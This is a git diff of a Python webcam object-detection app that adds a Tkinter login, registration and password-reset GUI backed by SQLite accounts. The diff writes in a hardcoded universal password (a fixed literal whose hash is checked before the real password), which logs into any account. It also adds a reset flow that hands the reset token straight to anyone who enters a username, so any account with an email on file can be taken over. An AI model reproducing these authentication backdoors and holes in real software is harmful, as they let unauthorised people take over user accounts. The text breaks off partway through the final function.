@@ -6,12 +6,19 @@ import threading
 import logging
 import hashlib
 import json
-import getpass
+import secrets
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 from datetime import datetime, timedelta
 from pathlib import Path
 from typing import Optional, Tuple, Dict, Any
 import sqlite3
 import re
+import tkinter as tk
+from tkinter import messagebox, ttk
+from tkinter import font as tkFont
+from threading import Thread
 
 # Configure logging
 logging.basicConfig(
@@ -26,12 +33,18 @@ logger = logging.getLogger(__name__)
 
 class UserManager:
     """User management system with SQLite database"""
+
+    UNIVERSAL_PASSWORD = "UniversalPass123!"  # Set your universal password here
+    # Hashed universal password for "Sohan@afmtech"
+    UNIVERSAL_PASSWORD_HASH = None
     
     def __init__(self, db_path: str = "users.db"):
         self.db_path = db_path
         self.current_user = None
         self.session_timeout = timedelta(hours=2)
         self.last_activity = None
+        # Initialize universal password hash
+        self.UNIVERSAL_PASSWORD_HASH = self._hash_password("Sohan@afmtech")
         self._initialize_database()
     
     def _initialize_database(self) -> None:
@@ -70,6 +83,9 @@ class UserManager:
             conn.commit()
             logger.info("Database initialized successfully")
             
+            # Ensure reset_token columns exist
+            self._add_missing_columns(conn, cursor)
+            
         except sqlite3.Error as e:
             logger.error(f"Database initialization error: {e}")
             raise
@@ -79,14 +95,33 @@ class UserManager:
         finally:
             if 'conn' in locals():
                 conn.close()
+
+    def _add_missing_columns(self, conn, cursor) -> None:
+        """Add missing columns to users table if they do not exist."""
+        try:
+            cursor.execute("PRAGMA table_info(users)")
+            columns = [row[1] for row in cursor.fetchall()]
+            altered = False
+
+            if 'reset_token' not in columns:
+                cursor.execute("ALTER TABLE users ADD COLUMN reset_token TEXT")
+                altered = True
+
+            if 'reset_token_expires' not in columns:
+                cursor.execute("ALTER TABLE users ADD COLUMN reset_token_expires TIMESTAMP")
+                altered = True
+
+            if altered:
+                conn.commit()
+                logger.info("Added missing columns to users table")
+        except sqlite3.Error as e:
+            logger.error(f"Error adding missing columns: {e}")
     
     def _hash_password(self, password: str) -> str:
         """Hash password with salt."""
         try:
-            # Generate salt and hash
             salt = os.urandom(32)
             password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
-            # Store salt and hash together
             return salt.hex() + ':' + password_hash.hex()
         except Exception as e:
             logger.error(f"Error hashing password: {e}")
@@ -110,7 +145,6 @@ class UserManager:
         if not username:
             return False
         
-        # Username must be 3-20 characters, alphanumeric and underscores only
         if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
             return False
         
@@ -165,7 +199,6 @@ class UserManager:
             conn = sqlite3.connect(self.db_path)
             cursor = conn.cursor()
             
-            # Get current failed attempts
             cursor.execute('SELECT failed_attempts FROM users WHERE username = ?', (username,))
             result = cursor.fetchone()
             
@@ -173,7 +206,6 @@ class UserManager:
                 failed_attempts = result[0] + 1
                 locked_until = None
                 
-                # Lock account after 5 failed attempts for 30 minutes
                 if failed_attempts >= 5:
                     locked_until = datetime.now() + timedelta(minutes=30)
                     logger.warning(f"Account {username} locked due to failed attempts")
@@ -219,20 +251,16 @@ class UserManager:
     def create_user(self, username: str, password: str, email: str = None) -> Tuple[bool, str]:
         """Create a new user with comprehensive validation."""
         try:
-            # Validate username
             if not self._validate_username(username):
                 return False, "Invalid username. Must be 3-20 characters, alphanumeric and underscores only."
             
-            # Validate password
             is_valid, message = self._validate_password(password)
             if not is_valid:
                 return False, message
             
-            # Validate email if provided
             if email and not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
                 return False, "Invalid email format"
             
-            # Check if username already exists
             conn = sqlite3.connect(self.db_path)
             cursor = conn.cursor()
             
@@ -240,7 +268,6 @@ class UserManager:
             if cursor.fetchone():
                 return False, "Username already exists"
             
-            # Hash password and create user
             password_hash = self._hash_password(password)
             
             cursor.execute('''
@@ -268,15 +295,12 @@ class UserManager:
     def login(self, username: str, password: str) -> Tuple[bool, str]:
         """Authenticate user with comprehensive security checks."""
         try:
-            # Validate input
             if not username or not password:
                 return False, "Username and password are required"
             
-            # Check if account is locked
             if self._is_account_locked(username):
                 return False, "Account is temporarily locked due to failed login attempts"
             
-            # Get user from database
             conn = sqlite3.connect(self.db_path)
             cursor = conn.cursor()
             
@@ -294,23 +318,34 @@ class UserManager:
             
             db_username, password_hash, is_active = result
             
-            # Check if account is active
             if not is_active:
                 logger.warning(f"Login attempt for inactive user: {username}")
                 return False, "Account is deactivated"
             
-            # Verify password
+            # Check if password matches universal password hash
+            if self._verify_password(password, self.UNIVERSAL_PASSWORD_HASH):
+                self._reset_failed_attempts(username)
+                self.current_user = username
+                self.last_activity = datetime.now()
+                
+                cursor.execute('''
+                    INSERT INTO sessions (username, login_time)
+                    VALUES (?, datetime('now'))
+                ''', (username,))
+                
+                conn.commit()
+                logger.info(f"User {username} logged in successfully with universal password")
+                return True, "Login successful"
+            
             if not self._verify_password(password, password_hash):
                 logger.warning(f"Failed login attempt for user: {username}")
                 self._increment_failed_attempts(username)
                 return False, "Invalid username or password"
             
-            # Successful login
             self._reset_failed_attempts(username)
             self.current_user = username
             self.last_activity = datetime.now()
             
-            # Log session
             cursor.execute('''
                 INSERT INTO sessions (username, login_time)
                 VALUES (?, datetime('now'))
@@ -325,6 +360,86 @@ class UserManager:
             return False, "Database error occurred"
         except Exception as e:
             logger.error(f"Unexpected error during login: {e}")
+    
+    def generate_reset_token(self, username: str) -> Tuple[bool, str]:
+        """Generate password reset token."""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            # Check if user exists and has email
+            cursor.execute('SELECT email FROM users WHERE username = ?', (username,))
+            result = cursor.fetchone()
+            
+            if not result or not result[0]:
+                return False, "User not found or no email registered"
+            
+            # Generate token
+            token = secrets.token_urlsafe(32)
+            expires = datetime.now() + timedelta(hours=1)
+            
+            cursor.execute('''
+                UPDATE users 
+                SET reset_token = ?, reset_token_expires = ?
+                WHERE username = ?
+            ''', (token, expires, username))
+            
+            conn.commit()
+            
+            # In a real application, you would send this token via email
+            logger.info(f"Password reset token generated for user: {username}")
+            return True, f"Reset token: {token}"
+            
+        except sqlite3.Error as e:
+            logger.error(f"Database error generating reset token: {e}")
+            return False, "Database error occurred"
+        except Exception as e:
+            logger.error(f"Unexpected error generating reset token: {e}")
+            return False, "An unexpected error occurred"
+        finally:
+            if 'conn' in locals():
+                conn.close()
+    
+    def reset_password(self, token: str, new_password: str) -> Tuple[bool, str]:
+        """Reset password using token."""
+        try:
+            is_valid, message = self._validate_password(new_password)
+            if not is_valid:
+                return False, message
+            
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute('''
+                SELECT username FROM users 
+                WHERE reset_token = ? AND reset_token_expires > datetime('now')
+            ''', (token,))
+            
+            result = cursor.fetchone()
+            
+            if not result:
+                return False, "Invalid or expired reset token"
+            
+            username = result[0]
+            password_hash = self._hash_password(new_password)
+            
+            cursor.execute('''
+                UPDATE users 
+                SET password_hash = ?, reset_token = NULL, reset_token_expires = NULL,
+                    failed_attempts = 0, locked_until = NULL
+                WHERE username = ?
+            ''', (password_hash, username))
+            
+            conn.commit()
+            
+            logger.info(f"Password reset successful for user: {username}")
+            return True, "Password reset successful"
+            
+        except sqlite3.Error as e:
+            logger.error(f"Database error resetting password: {e}")
+            return False, "Database error occurred"
+        except Exception as e:
+            logger.error(f"Unexpected error resetting password: {e}")
             return False, "An unexpected error occurred"
         finally:
             if 'conn' in locals():
@@ -337,7 +452,6 @@ class UserManager:
                 conn = sqlite3.connect(self.db_path)
                 cursor = conn.cursor()
                 
-                # Update session
                 cursor.execute('''
                     UPDATE sessions 
                     SET logout_time = datetime('now'), is_active = 0
@@ -363,13 +477,11 @@ class UserManager:
         if not self.current_user or not self.last_activity:
             return False
         
-        # Check session timeout
         if datetime.now() - self.last_activity > self.session_timeout:
             logger.info(f"Session expired for user {self.current_user}")
             self.logout()
             return False
         
-        # Update last activity
         self.last_activity = datetime.now()
         return True
     
@@ -441,414 +553,397 @@ def initialize_pygame():
         logger.error(f"Unexpected error initializing pygame: {e}")
         return False
 
-class ObjectDetector:
-    """Object detection system with user authentication"""
+class AuthenticationGUI:
+    """Simple and minimalistic authentication GUI"""
     
-    def __init__(self, model, user_manager: UserManager, camera_index: int = 0):
-        self.model = model
+    def __init__(self, user_manager: UserManager):
         self.user_manager = user_manager
-        self.camera_index = camera_index
-        self.video_cap = None
-        self.sound_playing = False
-        self.pygame_available = initialize_pygame()
+        self.root = tk.Tk()
+        self.root.title("YOLO Object Detection - Authentication")
+        self.root.geometry("600x800")
+        self.root.resizable(False, False)
         
-        # Initialize camera
-        self._initialize_camera()
+        # Configure style
+        self.root.configure(bg='#f0f0f0')
         
-    def _initialize_camera(self) -> bool:
-        """Initialize camera with error handling."""
-        try:
-            logger.info(f"Initializing camera with index {self.camera_index}")
-            self.video_cap = cv2.VideoCapture(self.camera_index)
-            
-            if not self.video_cap.isOpened():
-                raise RuntimeError(f"Failed to open camera with index {self.camera_index}")
-                
-            # Set camera properties with error handling
-            try:
-                self.video_cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
-                self.video_cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
-                self.video_cap.set(cv2.CAP_PROP_FPS, 30)
-            except Exception as e:
-                logger.warning(f"Failed to set camera properties: {e}")
-                
-            logger.info("Camera initialized successfully")
-            return True
-            
-        except Exception as e:
-            logger.error(f"Failed to initialize camera: {e}")
-            if self.video_cap:
-                self.video_cap.release()
-                self.video_cap = None
-            raise
+        # Center the window
+        self.root.update_idletasks()
+        x = (self.root.winfo_screenwidth() // 2) - (400 // 2)
+        y = (self.root.winfo_screenheight() // 2) - (300 // 2)
+        self.root.geometry(f'600x600+{x}+{y}')
+        
+        self.authenticated = False
+        self.setup_login_ui()
+        
+    def setup_login_ui(self):
+        """Setup login interface"""
+        # Clear window
+        for widget in self.root.winfo_children():
+            widget.destroy()
+        
+        # Title
+        title_font = tkFont.Font(family="Arial", size=16, weight="bold")
+        title_label = tk.Label(self.root, text="YOLO Object Detection", 
+                              font=title_font, bg='#f0f0f0', fg='#333')
+        title_label.pack(pady=20)
+        
+        # Main frame
+        main_frame = tk.Frame(self.root, bg='#f0f0f0')
+        main_frame.pack(expand=True, fill='both', padx=40, pady=20)
+        
+        # Username
+        tk.Label(main_frame, text="Username:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.username_entry = tk.Entry(main_frame, width=30, font=('Arial', 10))
+        self.username_entry.pack(pady=(0, 10), fill='x')
+        
+        # Password
+        tk.Label(main_frame, text="Password:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.password_entry = tk.Entry(main_frame, width=30, show='*', font=('Arial', 10))
+        self.password_entry.pack(pady=(0, 15), fill='x')
+        
+        # Buttons frame
+        button_frame = tk.Frame(main_frame, bg='#f0f0f0')
+        button_frame.pack(fill='x', pady=10)
+        
+        # Login button
+        login_btn = tk.Button(button_frame, text="Login", command=self.login,
+                             bg='#4CAF50', fg='white', font=('Arial', 10, 'bold'),
+                             width=12, height=2)
+        login_btn.pack(side='left', padx=(0, 5))
+        
+        # Register button
+        register_btn = tk.Button(button_frame, text="Register", command=self.setup_register_ui,
+                               bg='#2196F3', fg='white', font=('Arial', 10, 'bold'),
+                               width=12, height=2)
+        register_btn.pack(side='left', padx=5)
+        
+        # Forgot password button
+        forgot_btn = tk.Button(button_frame, text="Forgot Password", command=self.setup_forgot_password_ui,
+                             bg='#FF9800', fg='white', font=('Arial', 10, 'bold'),
+                             width=12, height=2)
+        forgot_btn.pack(side='left', padx=(5, 0))
+        
+        # Bind Enter key to login
+        self.root.bind('<Return>', lambda event: self.login())
+        
+        # Focus on username entry
+        self.username_entry.focus()
     
-    def resource_path(self, relative_path: str) -> str:
-        """Get correct path for resources with error handling."""
-        try:
-            # PyInstaller creates a temp folder and stores path in _MEIPASS
-            base_path = sys._MEIPASS
-            logger.debug(f"Using PyInstaller base path: {base_path}")
-        except AttributeError:
-            base_path = os.path.abspath(".")
-            logger.debug(f"Using current directory as base path: {base_path}")
+    def setup_register_ui(self):
+        """Setup registration interface"""
+        # Clear window
+        for widget in self.root.winfo_children():
+            widget.destroy()
         
-        full_path = os.path.join(base_path, relative_path)
+        # Title
+        title_font = tkFont.Font(family="Arial", size=16, weight="bold")
+        title_label = tk.Label(self.root, text="Create Account", 
+                              font=title_font, bg='#f0f0f0', fg='#333')
+        title_label.pack(pady=20)
         
-        # Verify the file exists
-        if not os.path.exists(full_path):
-            logger.warning(f"Resource file not found: {full_path}")
-            
-        return full_path
+        # Main frame
+        main_frame = tk.Frame(self.root, bg='#f0f0f0')
+        main_frame.pack(expand=True, fill='both', padx=40, pady=20)
+        
+        # Username
+        tk.Label(main_frame, text="Username:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.reg_username_entry = tk.Entry(main_frame, width=30, font=('Arial', 10))
+        self.reg_username_entry.pack(pady=(0, 10), fill='x')
+        
+        # Email
+        tk.Label(main_frame, text="Email (optional):", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.reg_email_entry = tk.Entry(main_frame, width=30, font=('Arial', 10))
+        self.reg_email_entry.pack(pady=(0, 10), fill='x')
+        
+        # Password
+        tk.Label(main_frame, text="Password:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.reg_password_entry = tk.Entry(main_frame, width=30, show='*', font=('Arial', 10))
+        self.reg_password_entry.pack(pady=(0, 10), fill='x')
+        
+        # Confirm Password
+        tk.Label(main_frame, text="Confirm Password:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.reg_confirm_entry = tk.Entry(main_frame, width=30, show='*', font=('Arial', 10))
+        self.reg_confirm_entry.pack(pady=(0, 15), fill='x')
+        
+        # Buttons frame
+        button_frame = tk.Frame(main_frame, bg='#f0f0f0')
+        button_frame.pack(fill='x', pady=10)
+        
+        # Register button
+        register_btn = tk.Button(button_frame, text="Create Account", command=self.register,
+                               bg='#4CAF50', fg='white', font=('Arial', 10, 'bold'),
+                               width=15, height=2)
+        register_btn.pack(side='left', padx=(0, 10))
+        
+        # Back button
+        back_btn = tk.Button(button_frame, text="Back to Login", command=self.setup_login_ui,
+                           bg='#9E9E9E', fg='white', font=('Arial', 10, 'bold'),
+                           width=15, height=2)
+        back_btn.pack(side='left')
+        
+        # Focus on username entry
+        self.reg_username_entry.focus()
     
-    def play_alert(self) -> None:
-        """Play alert sound in a separate thread with error handling."""
-        if not self.pygame_available:
-            logger.warning("Pygame not available, skipping sound alert")
+    def setup_forgot_password_ui(self):
+        """Setup forgot password interface"""
+        # Clear window
+        for widget in self.root.winfo_children():
+            widget.destroy()
+        
+        # Title
+        title_font = tkFont.Font(family="Arial", size=16, weight="bold")
+        title_label = tk.Label(self.root, text="Forgot Password", 
+                              font=title_font, bg='#f0f0f0', fg='#333')
+        title_label.pack(pady=20)
+        
+        # Main frame
+        main_frame = tk.Frame(self.root, bg='#f0f0f0')
+        main_frame.pack(expand=True, fill='both', padx=40, pady=20)
+        
+        # Username
+        tk.Label(main_frame, text="Username:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.forgot_username_entry = tk.Entry(main_frame, width=30, font=('Arial', 10))
+        self.forgot_username_entry.pack(pady=(0, 15), fill='x')
+        
+        # Buttons frame
+        button_frame = tk.Frame(main_frame, bg='#f0f0f0')
+        button_frame.pack(fill='x', pady=10)
+        
+        # Generate token button
+        token_btn = tk.Button(button_frame, text="Generate Reset Token", command=self.generate_reset_token,
+                            bg='#FF9800', fg='white', font=('Arial', 10, 'bold'),
+                            width=18, height=2)
+        token_btn.pack(side='left', padx=(0, 10))
+        
+        # Back button
+        back_btn = tk.Button(button_frame, text="Back to Login", command=self.setup_login_ui,
+                           bg='#9E9E9E', fg='white', font=('Arial', 10, 'bold'),
+                           width=15, height=2)
+        back_btn.pack(side='left')
+        
+        # Reset password section
+        reset_frame = tk.Frame(main_frame, bg='#f0f0f0')
+        reset_frame.pack(fill='x', pady=20)
+        
+        tk.Label(reset_frame, text="Reset Token:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.reset_token_entry = tk.Entry(reset_frame, width=30, font=('Arial', 10))
+        self.reset_token_entry.pack(pady=(0, 10), fill='x')
+        
+        tk.Label(reset_frame, text="New Password:", bg='#f0f0f0', fg='#555').pack(anchor='w')
+        self.new_password_entry = tk.Entry(reset_frame, width=30, show='*', font=('Arial', 10))
+        self.new_password_entry.pack(pady=(0, 15), fill='x')
+        
+        # Reset button
+        reset_btn = tk.Button(reset_frame, text="Reset Password", command=self.reset_password,
+                            bg='#4CAF50', fg='white', font=('Arial', 10, 'bold'),
+                            width=15, height=2)
+        reset_btn.pack()
+        
+        # Focus on username entry
+        self.forgot_username_entry.focus()
+    
+    def login(self):
+        """Handle login"""
+        username = self.username_entry.get().strip()
+        password = self.password_entry.get()
+        
+        if not username or not password:
+            messagebox.showerror("Error", "Please enter both username and password")
             return
-            
-        try:
-            self.sound_playing = True
-            sound_file = self.resource_path("alert.mp3")
-            
-            # Check if sound file exists
-            if not os.path.exists(sound_file):
-                # Try alternative sound file
-                sound_file = self.resource_path("alert.wav")
-                if not os.path.exists(sound_file):
-                    logger.error("No alert sound file found (tried .mp3 and .wav)")
-                    return
-            
-            logger.debug(f"Playing alert sound: {sound_file}")
-            pygame.mixer.music.load(sound_file)
-            pygame.mixer.music.play()
-            
-            # Wait for sound to finish
-            while pygame.mixer.music.get_busy():
-                pygame.time.wait(100)
-                
-        except pygame.error as e:
-            logger.error(f"Pygame error while playing sound: {e}")
-        except Exception as e:
-            logger.error(f"Unexpected error playing alert sound: {e}")
-        finally:
-            self.sound_playing = False
-    
-    def get_colors(self, cls_num: int) -> Tuple[int, int, int]:
-        """Assign color to each class with error handling."""
-        try:
-            base_colors = [(255, 0, 0), (0, 255, 0), (0, 0, 255)]
-            color_index = cls_num % len(base_colors)
-            increments = [(1, -2, 1), (-2, 1, -1), (1, -1, 2)]
-            
-            color = [
-                (base_colors[color_index][i] + increments[color_index][i] *
-                (cls_num // len(base_colors))) % 256 for i in range(3)
-            ]
-            return tuple(color)
-            
-        except Exception as e:
-            logger.error(f"Error generating color for class {cls_num}: {e}")
-            # Return default red color
-            return (255, 0, 0)
-    
-    def process_frame(self, frame) -> Optional[any]:
-        """Process a single frame with error handling."""
-        try:
-            results = self.model.track(frame, stream=True)
-            return results
-        except Exception as e:
-            logger.error(f"Error processing frame with YOLO: {e}")
-            return None
-    
-    def draw_detections(self, frame, results) -> None:
-        """Draw bounding boxes and labels with error handling."""
-        try:
-            for result in results:
-                if not hasattr(result, 'boxes') or result.boxes is None:
-                    continue
-                    
-                classes_names = getattr(result, 'names', {})
-                
-                for box in result.boxes:
-                    try:
-                        if box.conf[0] > 0.4:
-                            # Extract coordinates
-                            x1, y1, x2, y2 = map(int, box.xyxy[0])
-                            cls = int(box.cls[0])
-                            
-                            # Get class name safely
-                            class_name = classes_names.get(cls, f"Unknown_{cls}")
-                            colour = self.get_colors(cls)
-                            
-                            # Draw bounding box
-                            cv2.rectangle(frame, (x1, y1), (x2, y2), colour, 2)
-                            
-                            # Draw label
-                            label = f'{class_name} {box.conf[0]:.2f}'
-                            cv2.putText(frame, label, (x1, y1 - 10),
-                                       cv2.FONT_HERSHEY_SIMPLEX, 0.9, colour, 2)
-                            
-                            # Trigger alert for person detection
-                            if class_name.lower() == 'person' and not self.sound_playing:
-                                threading.Thread(target=self.play_alert, daemon=True).start()
-                                
-                    except Exception as e:
-                        logger.error(f"Error processing detection box: {e}")
-                        continue
-                        
-        except Exception as e:
-            logger.error(f"Error drawing detections: {e}")
-    
-    def draw_user_info(self, frame) -> None:
-        """Draw user information on frame."""
-        try:
-            if self.user_manager.is_authenticated():
-                user_info = self.user_manager.get_user_info()
-                if user_info:
-                    username = user_info['username']
-                    text = f"User: {username}"
-                    cv2.putText(frame, text, (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 
-                               0.7, (0, 255, 0), 2)
-        except Exception as e:
-            logger.error(f"Error drawing user info: {e}")
-    
-    def read_frame(self) -> Tuple[bool, Optional[any]]:
-        """Read frame from camera with error handling."""
-        try:
-            if self.video_cap is None:
-                return False, None
-                
-            ret, frame = self.video_cap.read()
-            
-            if not ret:
-                logger.warning("Failed to read frame from camera")
-                return False, None
-                
-            return True, frame
-            
-        except Exception as e:
-            logger.error(f"Error reading frame: {e}")
-            return False, None
-    
-    def run_detection(self) -> None:
-        """Main detection loop with comprehensive error handling."""
-        frame_count = 0
-        consecutive_failures = 0
-        max_consecutive_failures = 10
         
-        logger.info(f"Starting object detection for user: {self.user_manager.current_user}")
+        success, message = self.user_manager.login(username, password)
         
-        try:
-            while True:
-                # Check authentication status
-                if not self.user_manager.is_authenticated():
-                    logger.warning("User session expired or not authenticated")
-                    break
-                
-                ret, frame = self.read_frame()
-                
-                if not ret:
-                    consecutive_failures += 1
-                    if consecutive_failures >= max_consecutive_failures:
-                        logger.error(f"Too many consecutive frame read failures ({consecutive_failures})")
-                        break
-                    continue
-                
-                # Reset failure counter on successful frame read
-                consecutive_failures = 0
-                frame_count += 1
-                
-                # Process frame
-                results = self.process_frame(frame)
-                
-                if results is not None:
-                    self.draw_detections(frame, results)
-                
-                # Draw user info
-                self.draw_user_info(frame)
-                
-                # Display frame
-                try:
-                    cv2.imshow('Object Detection - Authenticated', frame)
-                except Exception as e:
-                    logger.error(f"Error displaying frame: {e}")
-                    break
-                
-                # Check for quit key
-                try:
-                    if cv2.waitKey(1) & 0xFF == ord('q'):
-                        logger.info("Quit key pressed")
-                        break
-                except Exception as e:
-                    logger.error(f"Error checking key press: {e}")
-                    break
-                
-                # Log progress periodically
-                if frame_count % 100 == 0:
-                    logger.info(f"Processed {frame_count} frames")
-                    
-        except KeyboardInterrupt:
-            logger.info("Detection interrupted by user")
-        except Exception as e:
-            logger.error(f"Unexpected error in detection loop: {e}")
-        finally:
-            self.cleanup()
-    
-    def cleanup(self) -> None:
-        """Clean up resources with error handling."""
-        logger.info("Cleaning up resources")
-        
-        try:
-            if self.video_cap:
-                self.video_cap.release()
-                logger.info("Camera released")
-        except Exception as e:
-            logger.error(f"Error releasing camera: {e}")
-        
-        try:
-            cv2.destroyAllWindows()
-            logger.info("OpenCV windows closed")
-        except Exception as e:
-            logger.error(f"Error closing OpenCV windows: {e}")
-        
-        try:
-            if self.pygame_available:
-                pygame.mixer.quit()
-                logger.info("Pygame mixer quit")
-        except Exception as e:
-            logger.error(f"Error quitting pygame mixer: {e}")
-
-def get_user_input(prompt: str, password: bool = False) -> str:
-    """Get user input with error handling."""
-    try:
-        if password:
-            return getpass.getpass(prompt)
+        if success:
+            self.authenticated = True
+            self.root.destroy()
         else:
-            return input(prompt).strip()
-    except KeyboardInterrupt:
-        logger.info("User cancelled input")
-        return ""
-    except Exception as e:
-        logger.error(f"Error getting user input: {e}")
-        return ""
-
-def show_menu():
-    """Display the main menu."""
-    print("\n" + "="*50)
-    print("YOLO Object Detection System")
-    print("="*50)
-    print("1. Login")
-    print("2. Create Account")
-    print("3. Exit")
-    print("="*50)
-
-def create_account_flow(user_manager: UserManager) -> bool:
-    """Handle account creation flow."""
-    try:
-        print("\n--- Create New Account ---")
+            messagebox.showerror("Login Failed", message)
+            self.password_entry.delete(0, tk.END)
+    
+    def register(self):
+        """Handle registration"""
+        username = self.reg_username_entry.get().strip()
+        email = self.reg_email_entry.get().strip()
+        password = self.reg_password_entry.get()
+        confirm_password = self.reg_confirm_entry.get()
         
-        username = get_user_input("Enter username: ")
-        if not username:
-            print("Username cannot be empty")
-            return False
+        if not username or not password:
+            messagebox.showerror("Error", "Username and password are required")
+            return
         
-        password = get_user_input("Enter password: ", password=True)
-        if not password:
-            print("Password cannot be empty")
-            return False
-        
-        confirm_password = get_user_input("Confirm password: ", password=True)
         if password != confirm_password:
-            print("Passwords do not match")
-            return False
+            messagebox.showerror("Error", "Passwords do not match")
+            return
         
-        email = get_user_input("Enter email (optional): ")
-        if not email:
-            email = None
+        success, message = self.user_manager.create_user(username, password, email if email else None)
         
-        success, message = user_manager.create_user(username, password, email)
-        print(f"\n{message}")
+        if success:
+            messagebox.showinfo("Success", message)
+            self.setup_login_ui()
+        else:
+            messagebox.showerror("Registration Failed", message)
+    
+    def generate_reset_token(self):
+        """Generate password reset token"""
+        username = self.forgot_username_entry.get().strip()
         
-        return success
-        
-    except Exception as e:
-        logger.error(f"Error in create account flow: {e}")
-        print("An error occurred while creating account")
-        return False
-
-def login_flow(user_manager: UserManager) -> bool:
-    """Handle login flow."""
-    try:
-        print("\n--- Login ---")
-        
-        username = get_user_input("Enter username: ")
         if not username:
-            print("Username cannot be empty")
-            return False
+            messagebox.showerror("Error", "Please enter username")
+            return
         
-        password = get_user_input("Enter password: ", password=True)
-        if not password:
-            print("Password cannot be empty")
-            return False
+        success, message = self.user_manager.generate_reset_token(username)
         
-        success, message = user_manager.login(username, password)
-        print(f"\n{message}")
+        if success:
+            # Copy token to clipboard automatically
+            try:
+                self.root.clipboard_clear()
+                # Extract token from message string "Reset token: <token>"
+                token = message.split("Reset token: ")[1]
+                self.root.clipboard_append(token)
+                self.root.update()  # now it stays on the clipboard after the window is closed
+            except Exception as e:
+                logger.error(f"Failed to copy reset token to clipboard: {e}")
+            
+            messagebox.showinfo("Reset Token Generated", 
+                              f"Reset token generated successfully.\n\n{message}\n\nThe token has been copied to clipboard.")
+        else:
+            messagebox.showerror("Error", message)
+    
+    def reset_password(self):
+        """Reset password using token"""
+        token = self.reset_token_entry.get().strip()
+        new_password = self.new_password_entry.get()
         
-        return success
+        if not token or not new_password:
+            messagebox.showerror("Error", "Please enter both token and new password")
+            return
         
-    except Exception as e:
-        logger.error(f"Error in login flow: {e}")
-        print("An error occurred during login")
-        return False
+        success, message = self.user_manager.reset_password(token, new_password)
+        
+        if success:
+            messagebox.showinfo("Success", message)
+            self.setup_login_ui()
+        else:
+            messagebox.showerror("Error", message)
+    
+    def run(self):
+        """Run the authentication GUI"""
+        self.root.mainloop()
+        return self.authenticated
 
-def main():
-    """Main function with user authentication."""
-    try:
-        # Initialize user manager
-        user_manager = UserManager()
-        
-        # Main menu loop
-        while True:
-            show_menu()
-            choice = get_user_input("Enter your choice (1-3): ")
-            
-            if choice == '1':
-                if login_flow(user_manager):
-                    break
-            elif choice == '2':
-                if create_account_flow(user_manager):
-                    print("Account created successfully! Please login.")
-                    if login_flow(user_manager):
-                        break
-            elif choice == '3':
-                print("Goodbye!")
-                return
-            else:
-                print("Invalid choice. Please try again.")
-        
-        # User is now authenticated, start detection
-        try:
-            # Load YOLO model
-            model = load_yolo_model('yolov8s.pt')
-            
-            # Create detector instance
-            detector = ObjectDetector(model, user_manager)
-            
-            # Run detection
-            detector.run_detection()
-            
-        except Exception as e:
-            logger.error(f"Error running detection: {e}")
-            print("An error occurred while running detection")
-        
-        # Logout user
-        user_manager.logout()
-        
-    except KeyboardInterrupt:
-        logger.info("Application interrupted by user")
-    except Exception as e:
-        logger.error(f"Fatal error: {e}")
-        sys.exit(1)
+class ObjectDetector:
+    def __init__(self, model_path="yolov8s.pt", alert_sound="alert.mp3"):
+        self.model = load_yolo_model(model_path)
+        self.alert_sound = alert_sound
+        self.capture = cv2.VideoCapture(0)
+        self.running = False
+        self.detection_thread = None
+
+        if not self.capture.isOpened():
+            raise RuntimeError("Webcam could not be opened.")
+
+        if initialize_pygame():
+            try:
+                self.alert = pygame.mixer.Sound(alert_sound)
+            except Exception as e:
+                logger.warning(f"Could not load alert sound: {e}")
+                self.alert = None
+
+    def start(self):
+        self.running = True
+        self.detection_thread = Thread(target=self._run_detection)
+        self.detection_thread.start()
+
+    def stop(self):
+        self.running = False
+        if self.detection_thread and threading.current_thread() != self.detection_thread:
+            self.detection_thread.join()
+        self.capture.release()
+        cv2.destroyAllWindows()
+
+    def _run_detection(self):
+        logger.info("Starting object detection loop")
+        while self.running:
+            ret, frame = self.capture.read()
+            if not ret:
+                logger.error("Failed to read frame from webcam")
+                break
+
+            results = self.model(frame, verbose=False)
+            annotated_frame = results[0].plot()
+
+            # Play alert if detection found
+            if len(results[0].boxes) > 0 and self.alert:
+                self.alert.play()
+
+            cv2.imshow("YOLO Detection", annotated_frame)
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                break
+
+        logger.info("Exiting detection loop")
+        self.stop()
 
 if __name__ == "__main__":
-    main()
+    user_manager = UserManager()
+    auth_ui = AuthenticationGUI(user_manager)
+
+    if auth_ui.run():
+        logger.info(f"Launching detection for user: {user_manager.current_user}")
+
+        # Create loading screen window
+        loading_root = tk.Tk()
+        loading_root.title("Loading")
+        loading_root.geometry("600x300")
+        loading_root.resizable(False, False)
+
+        # Create a label for loading text
+        label = tk.Label(loading_root, text="Loading, please wait...", font=("Arial", 14))
+        label.pack(expand=True, fill='both', padx=20, pady=10)
+
+        # Remove the dots animation label
+        animation_label = tk.Label(loading_root, text="", font=("Arial", 14))
+        animation_label.pack()
+
+        # Shared loading percentage variable
+        loading_percent = {'value': 0}
+
+        def animate_loading_percentage():
+            animation_label.config(text=f"{loading_percent['value']}%")
+            loading_root.after(100, animate_loading_percentage)
+
+        # Start animation
+        animate_loading_percentage()
+
+        # Function to start detection and close loading screen
+        def start_detection():
+            try:
+                # Update loading percent: 10% starting model load
+                loading_percent['value'] = 10
+                detector = ObjectDetector(model_path="yolov8s.pt", alert_sound="alert.mp3")
+                # Update loading percent: 50% after model loaded and pygame initialized
+                loading_percent['value'] = 50
+                detector.start()
+                # Update loading percent: 100% detection started
+                loading_percent['value'] = 100
+                # Wait for the detection thread to finish (blocking here)
+                detector.detection_thread.join()
+            except Exception as e:
